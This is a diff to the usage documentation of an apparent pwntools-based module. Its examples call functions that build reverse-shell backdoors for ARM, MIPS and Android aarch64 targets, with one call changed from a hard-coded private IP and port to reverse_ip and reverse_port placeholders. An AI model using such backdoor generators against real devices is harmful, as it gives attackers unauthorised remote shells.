@@ -38,7 +38,7 @@ When importing this module will import the pwn module
 >>> armebv7_backdoor(reverse_ip,reverse_port)
 >>> mips64_backdoor(reverse_ip,reverse_port)
 >>> mips64el_backdoor(reverse_ip,reverse_port)
->>> android_aarch64_backdoor("10.11.28.103",7878)
+>>> android_aarch64_backdoor(reverse_ip,reverse_port)
 ```
 expample:
 ```
